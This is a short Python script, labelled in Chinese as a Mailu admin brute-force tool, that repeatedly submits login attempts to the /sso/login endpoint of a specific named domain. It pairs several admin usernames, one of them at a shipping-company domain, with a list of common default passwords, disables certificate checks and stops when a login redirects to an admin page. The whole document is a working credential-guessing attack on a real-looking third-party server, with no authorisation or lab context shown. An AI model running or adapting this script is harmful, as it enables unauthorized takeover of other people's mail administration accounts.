#!/usr/bin/env python3
"""Mailu admin爆破"""
import urllib.request, http.cookiejar, ssl, sys, time

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
B = "http://51xyg.com"

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
op.addheaders = [("User-Agent","Mozilla/5.0")]

def try_login(email, pw):
    data = f"email={email}&pw={pw}&submitAdmin=Sign+in+Admin&pwned=-1".encode()
    try:
        r = op.open(urllib.request.Request(f"{B}/sso/login", data=data), timeout=8)
        body = r.read().decode("utf-8","ignore")
        url = r.geturl()
        # 成功=跳转到admin/或dashboard
        if "admin" in url or "dashboard" in url or "overview" in url:
            return f"SUCCESS({url})"
        if "error" in body.lower() or "invalid" in body.lower() or "wrong" in body.lower():
            return "FAIL"
        return f"UNKNOWN({len(body)}):{url}"
    except Exception as e:
        return f"ERR:{str(e)[:40]}"

for email in ["admin", "admin@51xyg.com", "admin@oura-shipping.com", "root", "postmaster"]:
    for pw in ["admin", "admin123", "123456", "mailu", "Mailu", "admin888", "password",
               "12345678", "admin@123", "mailu123", "mailuadmin", "admin2024", "admin2025",
               "admin2026", "changeme", "change123", "test123", "test", "123456789",
               "Admin123", "Admin888", "P@ssw0rd", "passw0rd", "123123", "111111", "888888"]:
        r = try_login(email, pw)
        if r.startswith("SUCCESS"):
            print(f"!!! {email}/{pw}: {r}", flush=True)
            sys.exit(0)
        elif r.startswith("ERR") or r.startswith("UNKNOWN"):
            print(f"[{email}] {pw}: {r}", flush=True)
            break
        time.sleep(0.2)
print("DONE")
